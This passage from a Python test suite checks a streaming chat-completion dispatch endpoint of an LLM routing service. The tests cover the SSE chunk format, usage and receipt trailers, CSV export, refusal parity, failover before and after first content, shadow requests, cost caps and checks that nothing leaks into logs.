    return choice_chunks, (trailing[0] if trailing else None), (errors[0] if errors else None), done


def _content(choice_chunks):
    return "".join(c["choices"][0]["delta"].get("content") or "" for c in choice_chunks)


def _receipts(svc_key=SVC_KEY_1, **params):
    query = "&".join(f"{k}={v}" for k, v in params.items())
    return client.get(f"/dispatch/receipts?{query}", headers={"x-api-key": svc_key})


# ---------------------------------------------------------------------------
# AC1 / AC2 / AC3 / AC18 — the chunk stream
# ---------------------------------------------------------------------------

def test_ac1_streamed_dispatch_is_openai_chunk_sse(env):
    resp = _stream_post()
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/event-stream")
    events = _parse_sse(resp.text)
    assert events[-1] == "[DONE]" and resp.text.rstrip().endswith("data: [DONE]")
    assert all(isinstance(e, dict) and e["object"] == "chat.completion.chunk" for e in events[:-1])
    choice_chunks, trailing, error, done = _split_stream(resp)
    assert done and error is None and trailing is not None
    assert _content(choice_chunks) == COMPLETION
    assert [c["choices"][0]["delta"].get("content") for c in choice_chunks[:-1]] == PIECES
    assert env["executor"].calls == [("model-b", KEY)]


def test_ac2_ids_and_model_are_stable_and_match_the_receipt(env):
    resp = _stream_post()
    choice_chunks, trailing, _, _ = _split_stream(resp)
    receipt = trailing["dispatch_receipt"]
    ids = {c["id"] for c in choice_chunks} | {trailing["id"]}
    assert len(ids) == 1
    expected = "chatcmpl-" + uuid.UUID(receipt["dispatch_id"]).hex[:24]
    assert ids == {expected}
    assert {c["model"] for c in choice_chunks} | {trailing["model"]} == {"model-b"}
    assert len({c["created"] for c in choice_chunks} | {trailing["created"]}) == 1
    rows = _receipts(format="json").json()["receipts"]
    assert len(rows) == 1 and rows[0]["dispatch_id"] == receipt["dispatch_id"]
    # Same id derivation as the non-streaming path for the same dispatch_id.
    plain = _post().json()
    assert plain["id"] == "chatcmpl-" + uuid.UUID(plain["dispatch_receipt"]["dispatch_id"]).hex[:24]


@pytest.mark.parametrize("script,expected", [({}, "stop"), ({"model-b": "length"}, "length")])
def test_ac3_finish_reason_once_on_a_final_empty_delta_chunk(env, script, expected):
    env["executor"].script = script
    choice_chunks, _, _, _ = _split_stream(_stream_post())
    content_chunks, last = choice_chunks[:-1], choice_chunks[-1]
    assert all(c["choices"][0]["finish_reason"] is None for c in content_chunks)
    assert all(c["choices"][0]["delta"].get("content") for c in content_chunks)
    assert last["choices"][0]["finish_reason"] == expected and last["choices"][0]["delta"] == {}
    assert content_chunks[0]["choices"][0]["delta"]["role"] == "assistant"
    assert all("role" not in c["choices"][0]["delta"] for c in content_chunks[1:])
    assert all(c["choices"][0]["index"] == 0 for c in choice_chunks)


def test_ac3_empty_completion_still_has_one_choices_chunk(env):
    env["executor"].pieces = []
    choice_chunks, trailing, _, done = _split_stream(_stream_post())
    assert done and len(choice_chunks) == 1
    assert choice_chunks[0]["choices"][0] == {"index": 0, "delta": {"role": "assistant"}, "finish_reason": "stop"}


def test_ac18_sse_transport_headers(env):
    """Same transport headers /router/recommend/stream and /agent/chat/stream send."""
    resp = _stream_post()
    for k, v in SSE_HEADERS.items():
        assert resp.headers[k] == v
    assert resp.headers["content-type"].startswith("text/event-stream")


def test_stream_options_is_accepted_and_usage_is_always_sent(env):
    resp = _stream_post({"stream_options": {"include_usage": False}})
    _, trailing, _, done = _split_stream(resp)
    assert done and trailing["usage"] == {"prompt_tokens": 100, "completion_tokens": 50, "total_tokens": 150}


# ---------------------------------------------------------------------------
# AC4 / AC5 / AC6 — usage, trailing receipt, export
# ---------------------------------------------------------------------------

def test_ac4a_measured_usage_in_stream_receipt_and_ledger(env):
    env["executor"].usage = (10, 5)
    _, trailing, _, _ = _split_stream(_stream_post())
    assert trailing["usage"] == {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15}
    r = trailing["dispatch_receipt"]
    assert r["usage"] == {"input_tokens": 10, "output_tokens": 5, "total_tokens": 15, "estimated": False}
    assert r["cost"]["actual_usd"] == pytest.approx(15 * 1e-6)
    summary = env["loop"].run_until_complete(env["usage"].get_summary(org_id="org-1"))
    assert summary["total_requests"] == 1 and summary["estimated_request_count"] == 0
    assert summary["total_cost_usd"] == pytest.approx(r["cost"]["actual_usd"], abs=1e-9)


def test_ac4b_estimated_usage_when_the_provider_sends_none(env):
    env["executor"].usage = None
    _, trailing, _, _ = _split_stream(_stream_post())
    # The patched tokenizer is a word count: PROMPT has 4 words, COMPLETION one.
    assert trailing["usage"] == {"prompt_tokens": 4, "completion_tokens": 1, "total_tokens": 5}
    r = trailing["dispatch_receipt"]
    assert r["usage"]["estimated"] is True and r["usage"]["total_tokens"] == 5
    summary = env["loop"].run_until_complete(env["usage"].get_summary(org_id="org-1"))
    assert summary["estimated_request_count"] == 1 and summary["has_estimated_usage"] is True
    assert _receipts().json()["receipts"][0]["usage_estimated"] is True


def test_ac5_trailing_chunk_carries_receipt_and_routing_metadata(env):
    _, trailing, _, _ = _split_stream(_stream_post())
    plain = _post().json()
    assert trailing["choices"] == []
    rm = trailing["routing_metadata"]
    assert rm["actual_forwarding"] is True and rm["dispatch_id"] == trailing["dispatch_receipt"]["dispatch_id"]
    assert set(trailing["dispatch_receipt"]) == set(plain["dispatch_receipt"])
    assert trailing["dispatch_receipt"]["streamed"] is True and plain["dispatch_receipt"]["streamed"] is False
    # The trailing chunk comes after the last content delta and before [DONE].
    events = _parse_sse(_stream_post().text)
    idx = next(i for i, e in enumerate(events) if isinstance(e, dict) and "dispatch_receipt" in e)
    assert all(not (isinstance(e, dict) and e.get("choices")) for e in events[idx:-1])
    assert events[-1] == "[DONE]" and idx == len(events) - 2


def test_ac6_export_distinguishes_streamed_rows(env):
    _, trailing, _, _ = _split_stream(_stream_post())
    plain = _post().json()
    rows = _receipts(format="json").json()["receipts"]
    by_id = {r["dispatch_id"]: r for r in rows}
    assert by_id[trailing["dispatch_receipt"]["dispatch_id"]]["streamed"] is True
    assert by_id[plain["dispatch_receipt"]["dispatch_id"]]["streamed"] is False
    assert all(r["usage_estimated"] is False for r in rows)
    csv_text = _receipts(format="csv").text
    table = list(csv.reader(io.StringIO(csv_text)))
    header = table[0]
    assert header == RECEIPT_COLUMNS and header[-2:] == ["streamed", "usage_estimated"]
    assert header[:31] == RECEIPT_COLUMNS[:31]        # the v1.77.0 columns, in their original order
    # Booleans export the way live_call always has ("True"/"False").
    col = {row[header.index("dispatch_id")]: row[header.index("streamed")] for row in table[1:]}
    assert col[trailing["dispatch_receipt"]["dispatch_id"]] == "True"
    assert col[plain["dispatch_receipt"]["dispatch_id"]] == "False"
    assert {row[header.index("live_call")] for row in table[1:]} == {"True"}


# ---------------------------------------------------------------------------
# AC7 — every pre-provider refusal is identical with and without `stream`
# ---------------------------------------------------------------------------

def _refusal_cases():
    hostile_cap = {"dispatch": {"objective": "cheapest", "max_request_cost_usd": 0.000001}}
    return [
        ("dispatch_disabled", {}, {}, lambda env: patch.object(main_module.settings, "dispatch_enabled", False)),
        ("tools", {"tools": [{"type": "function", "function": {"name": "f"}}]}, {}, None),
        ("anonymous", {}, {"svc_key": None}, None),
        ("unknown_key", {}, {"svc_key": "not-a-real-key"}, None),
        ("rate_limited", {}, {}, "rate_limit"),
        ("budget_hard_stop", {}, {}, "hard_stop"),
        ("no_candidate", {"dispatch": {"min_quality_score": 99}}, {}, None),
        ("pinned_ineligible", {"dispatch": {"objective": "pinned", "pinned_model": "model-c",
                                            "min_quality_score": 70}}, {}, None),
        ("unsupported_currency", {"dispatch": {"currency": "XYZ"}}, {}, None),
        ("over_request_cost_cap", hostile_cap, {}, None),
    ]


@pytest.mark.parametrize("name,body,kw,setup", _refusal_cases(), ids=[c[0] for c in _refusal_cases()])
def test_ac7_pre_provider_refusals_are_unchanged_by_stream(env, name, body, kw, setup):
    ctx = None
    if setup == "rate_limit":
        pass
    elif setup == "hard_stop":
        env["loop"].run_until_complete(
            env["budget"].register("https://example.com/hook", threshold_usd=0.0001, org_id="org-1", hard_stop=True)
        )
        env["loop"].run_until_complete(env["usage"].record_event("OpenAI", "model-a", 10, 10, 0.5, org_id="org-1"))
    elif callable(setup):
        ctx = setup(env)
    responses = []
    for extra in ({}, {"stream": True}):
        if setup == "rate_limit":
            main_module._rate_limit_store["cust-1"].extend([time.time()] * main_module.settings.rate_limit_free)
        if ctx is not None:
            with ctx:
                responses.append(_post({**body, **extra}, **kw))
        else:
            responses.append(_post({**body, **extra}, **kw))
    plain, streamed = responses
    assert plain.status_code == streamed.status_code and plain.status_code != 200, (name, streamed.text)
    assert streamed.headers["content-type"].startswith("application/json")
    assert plain.json() == streamed.json()
    assert env["executor"].calls == []


def test_ac7_global_operator_key_refused_with_stream(env):
    original = main_module.settings.mcp_api_key
    main_module.settings.mcp_api_key = GLOBAL_KEY
    try:
        plain, streamed = _post(svc_key=GLOBAL_KEY), _stream_post(svc_key=GLOBAL_KEY)
    finally:
        main_module.settings.mcp_api_key = original
    assert plain.status_code == streamed.status_code == 401 and plain.json() == streamed.json()
    assert env["executor"].calls == []


def test_ac7_dispatch_service_uninitialized_with_stream(env):
    with patch("src.main.get_dispatch_service", side_effect=RuntimeError("no")):
        resp = _stream_post()
    assert resp.status_code == 503 and resp.json()["error"] == "dispatch_unavailable"


# ---------------------------------------------------------------------------
# AC8 / AC9 / AC10 — failover before first content over HTTP
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("failure", ["rate_limited", "timeout", "server_error", "model_not_found"])
def test_ac8_pre_content_failure_fails_over_to_the_next_candidate(env, failure):
    env["executor"].script = {"model-b": failure}
    choice_chunks, trailing, error, done = _split_stream(_stream_post())
    assert done and error is None and _content(choice_chunks) == COMPLETION
    assert trailing["model"] == "model-a"
    r = trailing["dispatch_receipt"]
    assert r["chosen"]["model"] == "model-a"
    assert [(a["model"], a["outcome"]) for a in r["attempts"]] == [("model-b", failure), ("model-a", "ok")]
    assert [m for m, _ in env["executor"].calls] == ["model-b", "model-a"]


def test_ac9_auth_error_is_a_plain_400_without_sse(env):
    env["executor"].script = {"model-b": "auth_error"}
    resp = _stream_post()
    assert resp.status_code == 400 and resp.headers["content-type"].startswith("application/json")
    p = resp.json()
    assert p["error"] == "provider_auth_failed"
    assert set(p) >= {"provider", "model", "http_status", "attempts", "dispatch_id"}
    assert "data:" not in resp.text
    assert [m for m, _ in env["executor"].calls] == ["model-b"]
    plain = _post().json()
    assert set(plain) == set(p) and plain["provider"] == p["provider"] == "Anthropic"


def test_ac9_provider_rejected_and_exhaustion_are_plain_502s(env):
    env["executor"].script = {"model-b": "provider_rejected"}
    rej = _stream_post()
    assert rej.status_code == 502 and rej.json()["error"] == "provider_rejected"
    assert rej.headers["content-type"].startswith("application/json") and "data:" not in rej.text
    env["executor"].script = {"model-b": "timeout", "model-a": "server_error"}
    exhausted = _stream_post()
    assert exhausted.status_code == 502 and exhausted.headers["content-type"].startswith("application/json")
    p = exhausted.json()
    assert p["error"] == "all_attempts_failed"
    assert set(p) >= {"attempts", "eligible_remaining", "eliminating_constraint", "failover_enabled", "max_attempts",
                      "dispatch_id"}
    assert [a["outcome"] for a in p["attempts"]] == ["timeout", "server_error"]
    assert "data:" not in exhausted.text


def test_ac10_failover_off_is_a_single_attempt_502(env):
    env["executor"].script = {"model-b": "server_error"}
    resp = _stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                      "failover": {"enabled": False}}})
    assert resp.status_code == 502
    p = resp.json()
    assert p["error"] == "all_attempts_failed" and len(p["attempts"]) == 1 and p["failover_enabled"] is False
    assert [m for m, _ in env["executor"].calls] == ["model-b"]


# ---------------------------------------------------------------------------
# AC11 — failure after first content: error event, no failover
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("script,outcome", [
    (("fail_after", 2, "server_error"), "server_error"),
    (("eof_after", 2), "server_error"),
    (("fail_after", 2, "rate_limited"), "rate_limited"),
])
def test_ac11_mid_stream_failure_ends_with_an_error_event(env, script, outcome):
    env["executor"].pieces = ["COMPLETION-", "SENTINEL-", "XYZ"]
    env["executor"].script = {"model-b": script}
    resp = _stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70, "request_id": "r11"}})
    choice_chunks, trailing, error, done = _split_stream(resp)
    assert len(choice_chunks) == 2 and _content(choice_chunks) == "COMPLETION-SENTINEL-"
    assert all(c["choices"][0]["finish_reason"] is None for c in choice_chunks)
    assert trailing is None and not done
    events = _parse_sse(resp.text)
    assert "error" in events[-1] and events[-1] == error     # the error event is the last thing sent
    e = error["error"]
    assert e["outcome"] == outcome and e["code"] == outcome and e["type"] == "dispatch_error"
    assert e["model"] == "model-b" and e["provider"] == "Anthropic" and "message" in e
    assert len(e["attempts"]) == 1 and e["attempts"][0]["outcome"] == outcome
    assert [m for m, _ in env["executor"].calls] == ["model-b"]      # no failover
    rows = _receipts(outcome="failed").json()["receipts"]
    assert len(rows) == 1
    row = rows[0]
    assert row["dispatch_id"] == e["dispatch_id"] and row["streamed"] is True and row["attempts"] == 1
    assert json.loads(row["attempts_json"])[0]["outcome"] == outcome
    assert row["chosen_model"] == "model-b" and row["usage_estimated"] is True
    summary = env["loop"].run_until_complete(env["usage"].get_summary(org_id="org-1"))
    assert summary["total_requests"] == 1 and summary["estimated_request_count"] == 1
    assert summary["total_output_tokens"] == 1 and summary["total_input_tokens"] == 4   # delivered text, prompt


def test_ac21_stall_after_content_ends_with_a_timeout_error_event(env):
    env["executor"].script = {"model-b": ("stall_after", 1)}
    resp = _stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                      "failover": {"timeout_ms": 100}}})
    choice_chunks, _, error, done = _split_stream(resp)
    assert len(choice_chunks) == 1 and error["error"]["outcome"] == "timeout" and not done
    assert [m for m, _ in env["executor"].calls] == ["model-b"]


def test_ac21_no_content_within_timeout_fails_over(env):
    env["executor"].script = {"model-b": "hang"}
    resp = _stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                      "failover": {"timeout_ms": 100}}})
    choice_chunks, trailing, _, done = _split_stream(resp)
    assert done and trailing["model"] == "model-a" and _content(choice_chunks) == COMPLETION
    assert trailing["dispatch_receipt"]["attempts"][0]["outcome"] == "timeout"


# ---------------------------------------------------------------------------
# AC12 — shadow over HTTP
# ---------------------------------------------------------------------------

def test_ac12a_shadow_report_in_the_trailing_chunk(env):
    env["executor"].execute_delay = 0.2
    resp = _stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                      "shadow": {"model": "model-a"}, "request_id": "r12"}})
    choice_chunks, trailing, _, done = _split_stream(resp)
    assert done and _content(choice_chunks) == COMPLETION
    ex = env["executor"]
    assert max(ex.yielded["model-b"]) < ex.finished["model-a"]
    s = trailing["dispatch_receipt"]["shadow"]
    assert s["outcome"] == "success" and s["model"] == "model-a"
    assert set(s) >= {"input_tokens", "output_tokens", "cost_usd", "provider_latency_ms", "cost_delta_usd",
                      "latency_delta_ms"}
    con = sqlite3.connect(env["db"])
    ids = sorted(r[0] for r in con.execute("SELECT request_id FROM usage_events"))
    con.close()
    assert ids == ["r12", "r12:shadow"]


def test_ac12b_shadow_failure_does_not_fail_the_stream(env):
    env["executor"].script = {"model-a": "server_error"}
    resp = _stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                      "shadow": {"model": "model-a"}}})
    choice_chunks, trailing, error, done = _split_stream(resp)
    assert done and error is None and _content(choice_chunks) == COMPLETION
    assert trailing["dispatch_receipt"]["shadow"]["outcome"] == "server_error"
    assert len(choice_chunks) == len(PIECES) + 1          # the shadow's text never appears


# ---------------------------------------------------------------------------
# AC14 / AC15 / AC16 — cap, plain proxy, non-streaming unchanged
# ---------------------------------------------------------------------------

def test_ac14_cost_cap_applies_identically_with_stream(env):
    resp = _stream_post({"dispatch": {"objective": "cheapest", "max_request_cost_usd": 0.5}})
    assert resp.status_code == 200 and env["executor"].requests[-1].max_tokens == 100
    over = _stream_post({"dispatch": {"max_request_cost_usd": 0.000001}})
    plain = _post({"dispatch": {"max_request_cost_usd": 0.000001}})
    assert over.status_code == plain.status_code == 400 and over.json() == plain.json()
    assert over.json()["error"] == "no_eligible_candidate" and over.json()["eliminating_constraint"] == \
        "max_request_cost_usd"


def test_ac15_plain_proxy_ignores_stream(env):
    with patch("src.main.get_router", return_value=_mock_router()):
        base = client.post("/v1/chat/completions", json={"model": "gpt-4",
                                                         "messages": [{"role": "user", "content": "hello"}]})
        streamed = client.post("/v1/chat/completions", json={"model": "gpt-4", "stream": True,
                                                             "messages": [{"role": "user", "content": "hello"}]})
    assert streamed.status_code == 200 and streamed.headers["content-type"].startswith("application/json")
    a, b = base.json(), streamed.json()
    for d in (a, b):
        d.pop("id"), d.pop("created")
    assert a == b and b["routing_metadata"]["actual_forwarding"] is False and "dispatch_receipt" not in b
    assert env["executor"].calls == []


def test_ac16_non_streaming_response_unchanged_but_receipt_says_not_streamed(env):
    data = _post().json()
    assert data["object"] == "chat.completion" and data["choices"][0]["message"]["content"] == COMPLETION
    assert data["dispatch_receipt"]["streamed"] is False and data["dispatch_receipt"]["usage"]["estimated"] is False
    assert set(data) == {"id", "object", "created", "model", "choices", "usage", "routing_metadata",
                         "dispatch_receipt"}


# ---------------------------------------------------------------------------
# AC17 — no leaks on any streaming path
# ---------------------------------------------------------------------------

def test_ac17_no_leak_on_streaming_paths(env, caplog):
    caplog.set_level(logging.DEBUG)
    responses = [_stream_post()]                                              # success
    env["executor"].script = {"model-b": "server_error"}
    responses.append(_stream_post())                                          # pre-content failover
    env["executor"].script = {"model-b": ("fail_after", 1, "server_error")}
    responses.append(_stream_post())                                          # mid-stream failure
    env["executor"].script = {}
    responses.append(_stream_post({"dispatch": {"objective": "cheapest", "min_quality_score": 70,
                                                "shadow": {"model": "model-a"}}}))   # shadow
    env["executor"].script = {"model-b": "auth_error"}
    responses.append(_stream_post())                                          # terminal JSON error
    assert [r.status_code for r in responses] == [200, 200, 200, 200, 400]
    assert [_is_sse(r) for r in responses] == [True, True, True, True, False]
    _assert_no_sentinels(env, caplog, responses)


# ---------------------------------------------------------------------------
# AC20 — user-facing text no longer says "non-streaming"
# ---------------------------------------------------------------------------

def test_ac20_unsupported_feature_message_and_providers_note(env):
    resp = _post({"tools": [{"type": "function", "function": {"name": "f"}}], "stream": True})
    assert resp.status_code == 400 and resp.json()["feature"] == "tools"
    msg = resp.json()["message"]
    assert "non-streaming" not in msg and "streaming is supported" in msg
    assert "tools" in msg
    note = client.get("/dispatch/providers").json()["note"]
    assert "stream: true" in note


def test_ac20_docs_no_longer_claim_streaming_is_unsupported():
    root = Path(__file__).parent.parent
    readme = (root / "README.md").read_text(encoding="utf-8")
    arch = (root / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
    whats_new = (root / "static" / "whats-new" / "index.html").read_text(encoding="utf-8")
    assert "non-streaming, text-only" not in readme and "`stream: true`" in readme
    assert "no streaming" not in arch and "stream: true" in arch
    assert "v1.78.0" in whats_new and "stream" in whats_new.lower()
